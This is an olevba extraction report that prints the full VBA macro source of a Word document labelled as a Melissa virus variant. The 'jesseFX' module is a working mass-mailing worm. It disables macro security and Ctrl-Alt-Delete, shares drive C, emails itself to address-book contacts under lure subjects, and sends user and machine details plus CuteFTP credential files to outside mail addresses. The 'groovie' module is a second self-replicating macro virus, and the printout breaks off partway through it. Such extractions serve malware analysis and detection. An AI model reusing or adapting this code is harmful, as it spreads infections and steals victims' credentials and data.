olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.m-5aaf3b848241b53f521213223f9a2ef3a37a2dd6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO jesseFX.cls 
in file: Virus.MSWord.Melissa.m-5aaf3b848241b53f521213223f9a2ef3a37a2dd6 - OLE stream: 'Macros/VBA/jesseFX'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, ByVal cbData As Long) As Long
Private Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegFlushKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
Private Sub Document_Close()
Randomize
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (5 - 5): Options.VirusProtection = (5 - 5): Options.SaveNormalPrompt = (5 - 5)
End If
ShareDriveC
DisableCtrlAltDelete (True)
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "jesseFX") <> 1 Then _
DoMail (Int(Rnd * 30) + 30) / 100, True
DoInf
DisableCtrlAltDelete (False)
End Sub
Private Function DisableCtrlAltDelete(bDisabled As Boolean)
    x = SystemParametersInfo(97, bDisabled, CStr(1), 0)
End Function
Private Function DoMail(Percent, Info As Boolean)
Dim UDasOutlook, DasMapiName, MyMail, MyInfo, oFolder
Set UDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UDasOutlook.GetNamespace("MAPI")
If UDasOutlook = "Outlook" Then
DasMapiName.Logon "profile", "password"
    For y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(y)
        Set MyMail = UDasOutlook.CreateItem(0)
        TotList = AddyBook.AddressEntries.Count
        If TotList > 10 Then
         TotMail = Int(TotList * Percent)
         tmp = TotMail - 1
         AdrBegin = Int(Rnd * (TotList - tmp)) + 1
         AdrStop = AdrBegin + tmp
        Else
         AdrBegin = 1
         AdrStop = TotList
        End If
        For x = AdrBegin To AdrStop
            EAdr = AddyBook.AddressEntries(x)
            MyMail.Recipients.Add EAdr
        Next x
          Set oFolder = DasMapiName.GetDefaultFolder(6)
          RNItem = Int(Rnd * oFolder.items.Count) + 1
        With MyMail
         .Attachments.Add ActiveDocument.FullName
         .Importance = Int(Rnd * 2) + 1
         .DeleteAfterSubmit = True
          If oFolder.items.Count > 0 And Int(Rnd * 3) + 1 > 1 Then _
         .body = oFolder.items(RNItem).body
         .Subject = SmartSubj
         .Send
        End With
    Next y
    If Info = True Then
     DefltCuteFTP = "c:\progra~1\cuteftp\tree.dat"
        If Dir(DefltCuteFTP) = "" Then
         With Application.FileSearch
          .FileName = "tree.dat"
          .LookIn = "c:\progra~1\"
          .SearchSubFolders = True
          .Execute
          CuteFTP = .FoundFiles(1)
         End With
        Else
          CuteFTP = DefltCuteFTP
        End If
        If CuteFTP <> "" Then
         tmpkey = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
         tmpkey2 = "HKEY_LOCAL_MACHINE\System\CurrentControlSet\control\"
         Usr = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Network\Logon", "Username")
         PC = System.PrivateProfileString("", tmpkey2 & "ComputerName\ComputerName", "ComputerName")
         Org = System.PrivateProfileString("", tmpkey, "RegisteredOrganization")
         TZone = System.PrivateProfileString("", tmpkey2 & "TimeZoneInformation", "StandardName")
         Set MyInfo = UDasOutlook.CreateItem(0)
         With MyInfo
          .Recipients.Add "infx" & "@iname.com"
          .Recipients.Add "fafx" & "@fastermail.com"
          .Recipients.Add "apfx" & "@apexmail.com"
          .DeleteAfterSubmit = True
          .Subject = "Usr:" & Usr & " - PC:" & PC & " - Org:" & Org & " - Zone:" & TZone & " (" & ActiveDocument.Name & ")"
          .Attachments.Add CuteFTP
          .Send
         End With
    End If
    End If
DasMapiName.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "jesseFX") = 1
End Function
Private Function SmartSubj()
Dim Word(1 To 3, 1 To 6) As String
Word(1, 1) = "Hello!": Word(2, 1) = "Hi,"
Word(1, 2) = "Here": Word(2, 2) = "I think this": Word(3, 2) = "Gee...Guess this"
Word(1, 3) = "is": Word(2, 3) = "used to be": Word(3, 3) = "are"
Word(1, 4) = "that": Word(2, 4) = "the": Word(3, 4) = "your"
Word(1, 5) = "file": Word(2, 5) = "document": Word(3, 5) = ".doc"
Word(1, 6) = "you requested": Word(2, 6) = "they asked"
For i = 1 To 6
x = Int(Rnd * 3) + 1
SmartSubj = SmartSubj & Word(x, i) & " "
Next i
End Function
Private Function DoInf()
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 1
If ADI1.Name <> "jesseFX" Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToInfect = ADI1
ADI1.Name = "jesseFX"
DoAD = True
End If
If NTI1.Name <> "jesseFX" Then
If NTCL > 0 Then _
NTI1.CodeModule.DeleteLines 1, NTCL
Set ToInfect = NTI1
NTI1.Name = "jesseFX"
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
Do While ADI1.CodeModule.Lines(1, 1) = ""
ADI1.CodeModule.DeleteLines 1
Loop
Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
ToInfect.CodeModule.DeleteLines 7
ToInfect.CodeModule.InsertLines 7, "Private Sub Document_Close()"
ToInfect.CodeModule.DeleteLines ADCL - 3
ToInfect.CodeModule.InsertLines ADCL - 3, "Document_Close"
End If
If DoAD = True Then
Do While NTI1.CodeModule.Lines(1, 1) = ""
NTI1.CodeModule.DeleteLines 1
Loop
Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
ToInfect.CodeModule.DeleteLines 7
ToInfect.CodeModule.InsertLines 7, "Private Sub Document_Open()"
ToInfect.CodeModule.DeleteLines NTCL - 3
ToInfect.CodeModule.InsertLines NTCL - 3, "Document_Open"
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Function
Private Function ShareDriveC()
 ValString = 1
 ValBinary = 3
 ValDWord = 4
 HKEY_LOCAL_MACHINE = &H80000002
 Key1 = "Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C\"
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Flags", ValDWord, "770"
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Parm1enc", ValBinary, ""
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Parm2enc", ValBinary, ""
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Path", ValString, "C:\"
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Remark", ValString, "jesseFX"
WriteRegistry HKEY_LOCAL_MACHINE, Key1, "Type", ValDWord, "0"
End Function
Private Sub WriteRegistry(ByVal Group As Long, ByVal Section As String, ByVal Key As String, ByVal ValType As Long, ByVal Value As Variant)
Dim lResult As Long
Dim lKeyValue As Long
Dim InLen As Long
Dim lNewVal As Long
Dim sNewVal As String
On Error Resume Next
lResult = RegCreateKey(Group, Section, lKeyValue)
If ValType = 4 Or ValType = 3 Then
   lNewVal = CLng(Value)
   If ValType = 4 Then InLen = 4
   lResult = RegSetValueExLong(lKeyValue, Key, 0&, ValType, lNewVal, InLen)
Else
   If ValType = 1 Then Value = Value + Chr(0)
   sNewVal = Value
   InLen = Len(sNewVal)
   lResult = RegSetValueExString(lKeyValue, Key, 0&, 1&, sNewVal, InLen)
End If
lResult = RegFlushKey(lKeyValue)
lResult = RegCloseKey(lKeyValue)
End Sub
Private Sub ViewVBCode()
End Sub
Private Sub AutoExit()
Document_Close
End Sub
'jesse modified, !helob aisyalaM

-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Melissa.m-5aaf3b848241b53f521213223f9a2ef3a37a2dd6 - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I02 As Boolean
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I03 As Boolean
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I04 As Boolean
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I05 As Boolean
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I06 As String
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I07 As Boolean
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I08 As Boolean
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I09()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = NormalTemplate Then
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        I01 = "normal"
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        GoTo checkout
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
checkout:
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I10()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Next i
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Next i
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I11()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I09
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I10
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "document" Then Call I12
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "normal" Then Call I13
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "orbit" Then Call I14
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I12()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I03 = False And I05 = False Then
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With NormalTemplate.VBProject
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False Then
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I08 = False Then Documents.Open FileName:=I06
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Shell ("label c: groovie"), 0
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I13()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = False
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Call I17
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I04 = False And I07 = True Then
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With ActiveDocument.VBProject
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With Dialogs(wdDialogFileSummaryInfo)
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            .Comments = "ALT-F11 says it's groovie!"
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            .Execute
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False And I07 = True Then
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I08 = False Then Documents.Open FileName:=I06
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False And I07 = False Then
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Documents.Add Template:="", NewTemplate:=False
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = True
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I14()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = False
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I03 = False And I05 = False Then
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With NormalTemplate.VBProject
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            NormalTemplate.Save
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End If
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I04 = False Then
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With ActiveDocument.VBProject
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With Dialogs(wdDialogFileSummaryInfo)
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
                .Comments = "ALT-F11 says it's groovie!"
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
                .Execute
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End If
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = True
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I15()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.VirusProtection = False
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.SaveNormalPrompt = False
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.ConfirmConversions = False
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    I06 = ActiveDocument.FullName
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Call I11
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoOpen()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoClose()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
I08 = True
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoExit()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub FileSaveAs()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I16
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dialogs(wdDialogFileSaveAs).Show
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub filesave()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I16
